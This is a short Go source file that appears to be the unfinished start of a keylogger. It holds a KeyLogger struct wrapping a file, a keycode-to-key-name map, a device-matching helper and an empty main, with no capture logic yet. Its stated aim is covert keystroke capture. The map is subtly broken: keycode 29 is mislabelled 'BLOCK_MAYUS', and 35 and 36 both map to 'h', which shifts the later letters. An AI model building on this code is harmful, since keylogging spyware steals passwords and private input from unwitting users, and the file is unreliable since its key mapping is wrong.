package main

import (
	"os"
	"strings"
)

// Wrapper
type KeyLogger struct {
   fs *os.File
}

var keyMap = map[uint16]string{
    1: "ESC",
    2: "1",
    3: "2",
    4: "3",
    5: "4",
    6: "5",
    7: "6",
    8: "7",
    9: "8",
    10: "9",
    11: "0",
    12: "-",
    13: "=",
    14: "BACKSPACE",
    15: "tab",
    16: "q",
    17: "w",
    18: "e",
    19: "r",
    20: "t",
    21: "y",
    22: "u",
    23: "i",
    24: "o",
    25: "p",
    26: "[",
    27: "]",
    28: "ENTER",
    29: "BLOCK_MAYUS",
    30: "a",
    31: "s",
    32: "d",
    33: "f",
    34: "g",
    35: "h",
    36: "h",
    37: "j",
    38: "k",
    39: "l",
    40: ";",
    41: "'",
    42: "SHIFT",
}

type device []string

// Looks if there are any devices in the system
func (d *device) hasDevice(s string) bool{
    for _, device := range *d {
        if strings.Contains(s, device) {
            return true
        }
    }
    return false
}


func main() {
}
